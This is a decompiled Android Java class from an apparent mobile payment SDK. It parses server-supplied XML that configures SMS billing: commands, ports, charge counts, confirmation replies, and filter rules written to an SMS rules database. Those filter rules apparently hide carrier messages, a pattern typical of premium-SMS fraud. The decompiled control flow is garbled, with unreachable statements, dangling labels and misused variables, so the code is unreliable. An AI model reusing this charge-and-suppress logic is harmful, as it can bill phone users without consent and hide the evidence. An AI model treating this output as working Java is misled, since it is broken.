package com.zhangzhifu.sdk.protocolstack;

import android.content.Context;
import android.util.Xml;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.FeeBean;
import com.zhangzhifu.sdk.modle.FeeModeBean;
import com.zhangzhifu.sdk.modle.LiantongBean;
import com.zhangzhifu.sdk.modle.MMBean;
import com.zhangzhifu.sdk.modle.MMProcedure;
import com.zhangzhifu.sdk.modle.MMQBean;
import com.zhangzhifu.sdk.modle.MMQProcedure;
import com.zhangzhifu.sdk.modle.MMQWap;
import com.zhangzhifu.sdk.modle.MMWap;
import com.zhangzhifu.sdk.modle.OnlineGameBean;
import com.zhangzhifu.sdk.modle.OnlineProcedure;
import com.zhangzhifu.sdk.modle.OnlineWap;
import com.zhangzhifu.sdk.modle.PcOnlineBean;
import com.zhangzhifu.sdk.modle.PcOnlineProcedure;
import com.zhangzhifu.sdk.modle.PcOnlineWap;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.modle.WoLianTProcedure;
import com.zhangzhifu.sdk.modle.WoLianTWap;
import com.zhangzhifu.sdk.modle.WoLianTbean;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.sms.database.DbAdapter;
import com.zhangzhifu.sdk.util.sms.util.RulesTools;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

public class ZhangPayXMLParser
{
  private static String cT;
  private static String cU;
  private Context bZ;
  private List cL;
  private FeeBean cM;
  private OnlineProcedure cN;
  private PcOnlineProcedure cO;
  private MMProcedure cP;
  private MMQProcedure cQ;
  private WoLianTProcedure cR;
  private String cS;
  private DbAdapter cV;
  
  public ZhangPayXMLParser() {}
  
  public List readXML(StringReader paramStringReader, Context paramContext)
  {
    this.bZ = paramContext;
    localXmlPullParser = Xml.newPullParser();
    try
    {
      localXmlPullParser.setInput(paramStringReader);
      i = localXmlPullParser.getEventType();
      ZhangPayLog.showSaveLog("Zpay", "eventType类型" + i);
      if (i != 1) {
        break label272;
      }
      paramStringReader.close();
    }
    catch (XmlPullParserException paramStringReader)
    {
      for (;;)
      {
        int i;
        paramStringReader.printStackTrace();
        ZhangPayLog.showSaveLog("Zpay", "解析文档失败　XmlPullParserException　" + paramStringReader.getMessage());
        continue;
        ZhangPayLog.v("zhangPay_log", "解析startTag");
        localObject = localXmlPullParser.getName();
        ZhangPayLog.v("zhangPay_log", "start_tag " + (String)localObject);
        if ((((String)localObject).equals("root")) || (((String)localObject).equals("procedure_1")) || (((String)localObject).equals("mutual")) || (((String)localObject).equals("procedure_pc1")) || (((String)localObject).equals("mutual_pc")) || (((String)localObject).equals("procedure_mm1")) || (((String)localObject).equals("mutual_mm")) || (((String)localObject).equals("procedure_mmq")) || (((String)localObject).equals("mutual_mmq")) || (((String)localObject).equals("procedure_wo1")) || (((String)localObject).equals("mutual_wo")) || (((String)localObject).equals("gateway"))) {
          break label3255;
        }
        String str1 = localXmlPullParser.nextText();
        try
        {
          if (!((String)localObject).equalsIgnoreCase("order_id")) {
            break;
          }
          SharePreferUtil.setOrderId(this.bZ, str1);
          ZhangPayLog.v("zhangPay_log", "OrderId " + SharePreferUtil.getOrderId(this.bZ));
        }
        catch (Exception localException1)
        {
          ZhangPayLog.showSaveLog("zhangPay_log", "协议解析属性错误" + localException1.getMessage());
        }
      }
    }
    catch (IOException paramStringReader)
    {
      for (;;)
      {
        label272:
        Object localObject;
        paramStringReader.printStackTrace();
        ZhangPayLog.showSaveLog("Zpay", "解析文档失败　IOException" + paramStringReader.getMessage());
        continue;
        if (!((String)localObject).equalsIgnoreCase("version")) {
          if (((String)localObject).equalsIgnoreCase("fee_type")) {
            SharePreferUtil.setFeeType(this.bZ, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("call_interval")) {
            SharePreferUtil.setCallInterval(this.bZ, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("call_max")) {
            SharePreferUtil.setMaxCall(this.bZ, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("fee")) {
            SharePreferUtil.setFee(this.bZ, localException1);
          } else if (((String)localObject).equalsIgnoreCase("prod_name")) {
            SharePreferUtil.setProdName(this.bZ, localException1);
          } else if (((String)localObject).equalsIgnoreCase("supp_name")) {
            SharePreferUtil.setSuppName(this.bZ, localException1);
          } else if (((String)localObject).equalsIgnoreCase("view_url")) {
            com.zhangzhifu.sdk.ui.FeeView.showString = localException1;
          } else if (!((String)localObject).equalsIgnoreCase("gateway")) {
            if (((String)localObject).equalsIgnoreCase("op"))
            {
              this.cS = localException1;
            }
            else if (((String)localObject).equalsIgnoreCase("fee_mode"))
            {
              localObject = new FeeModeBean();
              if (localException1.equalsIgnoreCase("0"))
              {
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "0");
                ((FeeModeBean)localObject).setFeemode("0");
                this.cM = new SMSBean();
                ((SMSBean)this.cM).setSms(true);
              }
              else if (localException1.equalsIgnoreCase("7"))
              {
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "7");
                ((FeeModeBean)localObject).setFeemode("7");
                this.cM = new SMSBean();
                ((SMSBean)this.cM).setSms(false);
              }
              else if (localException1.equalsIgnoreCase("10"))
              {
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "10");
                ((FeeModeBean)localObject).setFeemode("10");
                if (this.cS.equals("2")) {
                  this.cM = new LiantongBean();
                }
              }
              else if ((localException1.equalsIgnoreCase("13")) || (localException1.equalsIgnoreCase("14")))
              {
                ((FeeModeBean)localObject).setFeemode("13");
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "13");
                this.cM = new OnlineGameBean();
              }
              else if (localException1.equalsIgnoreCase("15"))
              {
                ((FeeModeBean)localObject).setFeemode("15");
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "15");
                this.cM = new PcOnlineBean();
              }
              else if (localException1.equalsIgnoreCase("16"))
              {
                ((FeeModeBean)localObject).setFeemode("16");
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "16");
                this.cM = new MMBean();
              }
              else if (localException1.equalsIgnoreCase("17"))
              {
                ((FeeModeBean)localObject).setFeemode("17");
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "17");
                this.cM = new WoLianTbean();
              }
              else if (localException1.equalsIgnoreCase("18"))
              {
                ((FeeModeBean)localObject).setFeemode("18");
                SharePreferUtil.getInstance().setFeeMode(this.bZ, "18");
                this.cM = new MMQBean();
              }
              else
              {
                this.cM = new OnlineWap();
              }
            }
            else if (((String)localObject).equalsIgnoreCase("is_pop"))
            {
              SharePreferUtil.setIsPOP(this.bZ, Integer.parseInt(localException1));
            }
            else if (((String)localObject).equalsIgnoreCase("cmd"))
            {
              if ((this.cM instanceof SMSBean)) {
                ((SMSBean)this.cM).setCmd(localException1);
              }
            }
            else if (((String)localObject).equalsIgnoreCase("port"))
            {
              if ((this.cM instanceof SMSBean)) {
                ((SMSBean)this.cM).setPort(localException1);
              }
            }
            else if (((String)localObject).equalsIgnoreCase("is_filter"))
            {
              this.cM.setIsFilter(localException1);
            }
            else if (((String)localObject).equalsIgnoreCase("is_second"))
            {
              if ((this.cM instanceof SMSBean)) {
                ((SMSBean)this.cM).setIsSecond(Integer.parseInt(localException1));
              }
            }
            else
            {
              if (((String)localObject).equalsIgnoreCase("filter_port"))
              {
                if ((SharePreferUtil.getInstance().getFilterPort(this.bZ) == null) || (SharePreferUtil.getInstance().getFilterPort(this.bZ).equals(""))) {
                  SharePreferUtil.getInstance().setFilterPort(this.bZ, localException1);
                }
                for (;;)
                {
                  cT = localException1;
                  this.cM.setFilterPort(localException1);
                  break;
                  SharePreferUtil.getInstance().setFilterPort(this.bZ, localException1);
                }
              }
              if (((String)localObject).equalsIgnoreCase("filter_info"))
              {
                ZhangPayLog.d("zhangPay_log", "需要过滤的信息为" + localException1);
                cU = localException1;
                this.cM.setFilterInfo(localException1);
              }
              else if (((String)localObject).equalsIgnoreCase("second_type"))
              {
                SharePreferUtil.getInstance().setSendType(this.bZ, localException1);
                boolean bool = this.cM instanceof SMSBean;
                if (bool) {
                  try
                  {
                    ((SMSBean)this.cM).setSecondType(Integer.parseInt(localException1));
                  }
                  catch (Exception localException2) {}
                }
              }
              else if (((String)localObject).equalsIgnoreCase("second_port"))
              {
                if ((this.cM instanceof SMSBean)) {
                  ((SMSBean)this.cM).setSecondPort(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_start_str"))
              {
                SharePreferUtil.getInstance().setSmsCodeBegin(this.bZ, localException2);
                if ((this.cM instanceof SMSBean)) {
                  ((SMSBean)this.cM).setReplyStartStr(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_end_str"))
              {
                SharePreferUtil.getInstance().setSmsCodeEnd(this.bZ, localException2);
                if ((this.cM instanceof SMSBean)) {
                  ((SMSBean)this.cM).setReplyEndStr(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_content"))
              {
                if ((this.cM instanceof SMSBean)) {
                  ((SMSBean)this.cM).setReplyContent(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("charge_count"))
              {
                if ((this.cM instanceof SMSBean)) {
                  ((SMSBean)this.cM).setChargeCount(Integer.parseInt(localException2));
                }
              }
              else if (((String)localObject).equalsIgnoreCase("sms_delay_time"))
              {
                if (((this.cM instanceof SMSBean)) && (!localException2.trim().equals(""))) {
                  ((SMSBean)this.cM).setSmsDelayTime(Integer.parseInt(localException2));
                }
              }
              else if (!((String)localObject).equalsIgnoreCase("mutual_mm"))
              {
                if (((String)localObject).equalsIgnoreCase("procedure_mm1")) {
                  this.cP = new MMProcedure();
                } else if (((String)localObject).equalsIgnoreCase("a_url_mm1"))
                {
                  if (this.cP != null) {
                    this.cP.setA_url(localException2);
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("type_mm1"))
                {
                  if (this.cP != null) {
                    this.cP.setType(Integer.parseInt(localException2));
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("sms_num_mm1"))
                {
                  if (this.cP != null) {
                    this.cP.setSms_num(localException2);
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("timer_mm1"))
                {
                  if (this.cP != null) {
                    this.cP.setTimer(Integer.parseInt(localException2));
                  }
                }
                else if (!((String)localObject).equalsIgnoreCase("mutual_mmq")) {
                  if (((String)localObject).equalsIgnoreCase("procedure_mmq")) {
                    this.cQ = new MMQProcedure();
                  } else if (((String)localObject).equalsIgnoreCase("a_url_mmq"))
                  {
                    if (this.cQ != null) {
                      this.cQ.setA_url(localException2);
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("type_mm1"))
                  {
                    if (this.cQ != null) {
                      this.cQ.setType(Integer.parseInt(localException2));
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("sms_num_mmq"))
                  {
                    if (this.cQ != null) {
                      this.cQ.setSms_num(localException2);
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("timer_mmq"))
                  {
                    if (this.cQ != null) {
                      this.cQ.setTimer(Integer.parseInt(localException2));
                    }
                  }
                  else if (!((String)localObject).equalsIgnoreCase("mutual_wo")) {
                    if (((String)localObject).equalsIgnoreCase("procedure_wo1")) {
                      this.cR = new WoLianTProcedure();
                    } else if (((String)localObject).equalsIgnoreCase("a_url_wo1"))
                    {
                      if (this.cR != null) {
                        this.cR.setA_url(localException2);
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("type_wo1"))
                    {
                      if (this.cR != null) {
                        this.cR.setType(Integer.parseInt(localException2));
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("sms_num_wo1"))
                    {
                      if (this.cR != null) {
                        this.cR.setSms_num(localException2);
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("timer_wo1"))
                    {
                      if (this.cR != null) {
                        this.cR.setTimer(Integer.parseInt(localException2));
                      }
                    }
                    else if (!((String)localObject).equalsIgnoreCase("mutual")) {
                      if (((String)localObject).equalsIgnoreCase("procedure_1")) {
                        this.cN = new OnlineProcedure();
                      } else if (((String)localObject).equalsIgnoreCase("a_url_1"))
                      {
                        if (this.cN != null) {
                          this.cN.setA_url(localException2);
                        }
                      }
                      else if (((String)localObject).equalsIgnoreCase("timer_1"))
                      {
                        if (this.cN != null) {
                          this.cN.setTimer(Integer.parseInt(localException2));
                        }
                      }
                      else if (((String)localObject).equalsIgnoreCase("type_1"))
                      {
                        if (this.cN != null) {
                          this.cN.setType(Integer.parseInt(localException2));
                        }
                      }
                      else if (((String)localObject).equalsIgnoreCase("sms_num_1"))
                      {
                        if (this.cN != null) {
                          this.cN.setSms_num(localException2);
                        }
                      }
                      else if (!((String)localObject).equalsIgnoreCase("mutual_pc")) {
                        if (((String)localObject).equalsIgnoreCase("procedure_pc1"))
                        {
                          this.cO = new PcOnlineProcedure();
                        }
                        else if (((String)localObject).equalsIgnoreCase("a_url_pc1"))
                        {
                          if (this.cO != null) {
                            this.cO.setA_url(localException2);
                          }
                        }
                        else if (((String)localObject).equalsIgnoreCase("timer_pc1"))
                        {
                          if (this.cO != null) {
                            this.cO.setTimer(Integer.parseInt(localException2));
                          }
                        }
                        else if (((String)localObject).equalsIgnoreCase("type_pc1"))
                        {
                          if (this.cO != null) {
                            this.cO.setType(Integer.parseInt(localException2));
                          }
                        }
                        else if ((((String)localObject).equalsIgnoreCase("sms_num_pc1")) && (this.cO != null))
                        {
                          this.cO.setSms_num(localException2);
                          continue;
                          ZhangPayLog.v("zhangPay_log", "解析endTag");
                          String str2 = localXmlPullParser.getName();
                          ZhangPayLog.v("zhangPay_log", "end_tag " + str2);
                          if (str2.equalsIgnoreCase("gateway"))
                          {
                            if ((this.cL != null) && (this.cM != null))
                            {
                              this.cL.add(this.cM);
                              ZhangPayLog.v("zhangPay_log", "endTag+allFees" + this.cL.size());
                            }
                          }
                          else if (str2.equalsIgnoreCase("procedure_1"))
                          {
                            if ((this.cM instanceof OnlineWap))
                            {
                              ZhangPayLog.v("zhangPay_log", "currentProed is " + this.cN);
                              ((OnlineWap)this.cM).getAllProcedure().add(this.cN);
                            }
                          }
                          else if (str2.equalsIgnoreCase("procedure_pc1"))
                          {
                            if ((this.cM instanceof PcOnlineWap))
                            {
                              ZhangPayLog.v("zhangPay_log", "currentProed is " + this.cO);
                              ((PcOnlineWap)this.cM).getAllProcedure().add(this.cO);
                            }
                          }
                          else if (str2.equalsIgnoreCase("procedure_mm1"))
                          {
                            if ((this.cM instanceof MMWap))
                            {
                              ZhangPayLog.v("zhangPay_log", "currentProed is " + this.cP);
                              ((MMWap)this.cM).getAllProcedure().add(this.cP);
                            }
                          }
                          else if (str2.equalsIgnoreCase("procedure_mmq"))
                          {
                            if ((this.cM instanceof MMQWap))
                            {
                              ZhangPayLog.v("zhangPay_log", "currentProed is " + this.cQ);
                              ((MMQWap)this.cM).getAllProcedure().add(this.cQ);
                            }
                          }
                          else if (str2.equalsIgnoreCase("procedure_wo1"))
                          {
                            if ((this.cM instanceof WoLianTWap))
                            {
                              ZhangPayLog.v("zhangPay_log", "currentProed is " + this.cR);
                              ((WoLianTWap)this.cM).getAllProcedure().add(this.cR);
                            }
                          }
                          else if (str2.equalsIgnoreCase("root"))
                          {
                            ZhangPayLog.v("zhangPay_log", "已经完成");
                            continue;
                            this.cV.createOne(cT.toLowerCase(), 0);
                            continue;
                            paramStringReader = cT.concat("*");
                            RulesTools.getInstance().addRuleToDatabaes(paramContext, 0, 0, paramStringReader);
                            continue;
                            RulesTools.getInstance().addRuleToDatabaes(paramContext, 8, 0, cU);
                            continue;
                            str2 = null;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    this.cV = new DbAdapter(paramContext);
    if ((cT != null) && (cT.length() > 0))
    {
      if (cT.contains("#"))
      {
        paramStringReader = cT.substring(0, cT.lastIndexOf("#"));
        this.cV.createOne(paramStringReader.toLowerCase(), 0);
      }
    }
    else
    {
      if ((cT != null) && (cT.length() > 0))
      {
        if (!cT.contains("#")) {
          break label3217;
        }
        paramStringReader = cT.substring(0, cT.lastIndexOf("#")).concat("*");
        RulesTools.getInstance().addRuleToDatabaes(paramContext, 0, 0, paramStringReader);
      }
      if ((cU != null) && (cU.length() > 0))
      {
        if (!cU.contains("#")) {
          break label3239;
        }
        paramStringReader = cU.substring(0, cU.lastIndexOf("#"));
        RulesTools.getInstance().addRuleToDatabaes(paramContext, 8, 0, paramStringReader);
        paramStringReader = cU.substring(cU.lastIndexOf("#") + 1, cU.length());
        RulesTools.getInstance().addRuleToDatabaes(paramContext, 8, 0, paramStringReader);
      }
      return this.cL;
      switch (i)
      {
      case 1: 
      default: 
      case 0: 
        for (;;)
        {
          i = localXmlPullParser.next();
          break;
          ZhangPayLog.showSaveLog("Zpay", "START_DOCUMENT");
          this.cL = new ArrayList();
        }
      }
    }
  }
}
